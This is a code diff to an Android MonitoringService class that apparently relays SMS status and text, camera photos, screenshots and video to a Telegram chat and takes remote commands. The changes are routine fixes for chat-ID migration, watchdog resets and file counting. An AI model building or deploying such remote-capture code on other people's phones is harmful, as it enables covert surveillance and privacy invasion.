@@ -555,12 +555,27 @@ class MonitoringService : Service() {
 
     private fun adoptMigratedChat(errorBody: String?, currentChatId: String): Boolean {
         val migrated = NetworkUtils.extractMigratedChatId(errorBody) ?: return false
+        val stored = try { preferencesManager.chatId } catch (_: Exception) { currentChatId }
+        if (migrated == stored) {
+            try {
+                preferencesManager.credentialError = ""
+                preferencesManager.credentialErrorAt = 0L
+                refreshCreds()
+            } catch (_: Exception) {
+            }
+            return true
+        }
         if (migrated == currentChatId) return false
         return try {
             preferencesManager.chatId = migrated
             preferencesManager.credentialError = ""
             preferencesManager.credentialErrorAt = 0L
             refreshCreds()
+            try {
+                messageQueue.addMessage("\u267B\uFE0F Group upgraded to supergroup \u2014 chat ID updated automatically.", true)
+                MessageScheduler.scheduleMessageSend(this)
+            } catch (_: Exception) {
+            }
             android.util.Log.i("MonitoringService", "Chat migrated to supergroup, adopting new chat id")
             true
         } catch (_: Exception) {
@@ -2246,7 +2261,9 @@ class MonitoringService : Service() {
                 } else if (okCount.get() > 0) {
                     preferencesManager.setLastSmsSendAtSync(System.currentTimeMillis())
                     preferencesManager.writeSmsPendingSync("", "", 0L, "")
-                            sendToTelegram("\u26A0\uFE0F SMS partially sent (${okCount.get()}/$expected parts). Pending cleared so a retry cannot duplicate the delivered parts; verify with the recipient before sending again.")
+                    val smsPreview = try { Html.escape(smsText.take(120)) } catch (_: Exception) { "" }
+                    val smsNotice = if (smsPreview.isEmpty()) "\u26A0\uFE0F SMS partially sent (${okCount.get()}/$expected parts). Pending cleared so a retry cannot duplicate the delivered parts; verify with the recipient before sending again." else "\u26A0\uFE0F SMS partially sent (${okCount.get()}/$expected parts) to $number. Pending cleared so a retry cannot duplicate the delivered parts; verify with the recipient before sending again. Text preview: $smsPreview"
+                    sendToTelegram(smsNotice)
                 } else {
                             sendToTelegram("\u26A0\uFE0F SMS not confirmed sent. Pending kept, try /smsconfirm again.")
                 }
@@ -2476,7 +2493,6 @@ class MonitoringService : Service() {
                 if (adoptMigratedChat(goneBody, chatId)) {
                     if (queueOnFail) {
                         messageQueue.addMessage(message)
-                        messageQueue.addMessage("\u267B\uFE0F Group upgraded to supergroup \u2014 chat ID updated automatically.", true)
                         MessageScheduler.scheduleMessageSend(this)
                     }
                     return false
@@ -2546,7 +2562,6 @@ class MonitoringService : Service() {
                             if (adoptMigratedChat(fbBody, chatId)) {
                                 if (queueOnFail) {
                                     messageQueue.addMessage(plain)
-                                    messageQueue.addMessage("\u267B\uFE0F Group upgraded to supergroup \u2014 chat ID updated automatically.", true)
                                     MessageScheduler.scheduleMessageSend(this)
                                 }
                                 return false
@@ -2652,12 +2667,17 @@ class MonitoringService : Service() {
         }
         watchdogJob?.cancel()
         videoWatchdog?.cancel()
+        shotWatchdog?.cancel()
+        cameraAttempt.incrementAndGet()
+        videoAttempt.incrementAndGet()
+        shotBusy.set(false)
         cameraBusy.set(false)
         smsBusy.set(false)
         ringBusy.set(false)
         recordBusy.set(false)
         audioFlushBusy.set(false)
         photoFlushBusy.set(false)
+        videoFlushBusy.set(false)
         try {
             cameraService.forceReset()
         } catch (_: Exception) {
@@ -3204,7 +3224,7 @@ class MonitoringService : Service() {
     private fun pendingVideoCount(): Int {
         return try {
             cacheDir.listFiles { file ->
-                file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4")
+                file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4") && file != activeVideoFile
             }?.size ?: 0
         } catch (_: Exception) {
             0
@@ -3214,7 +3234,7 @@ class MonitoringService : Service() {
     private fun pendingPhotoCount(): Int {
         return try {
             cacheDir.listFiles { file ->
-                file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg")
+                file.isFile && (file.name.startsWith("camera_") || file.name.startsWith("screenshot_")) && file.name.endsWith(".jpg") && file != activePhotoFile
             }?.size ?: 0
         } catch (_: Exception) {
             0
